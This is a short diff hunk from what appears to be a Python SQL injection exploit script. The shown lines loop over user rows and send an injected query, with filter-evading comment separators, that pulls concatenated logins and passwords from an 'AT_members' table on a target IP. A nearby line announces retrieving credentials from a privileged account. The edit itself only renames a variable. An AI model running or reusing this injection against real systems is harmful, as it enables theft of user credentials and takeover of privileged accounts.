@@ -125,7 +125,7 @@ def main():
 	usercount = count("login", ip)
 	for i in range(0, usercount):
 		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
-		username = inject(query, ip)
+		creds = inject(query, ip)
 		print("")
 
 	print("\n[+] Retrieving credentials from a privileged account...")
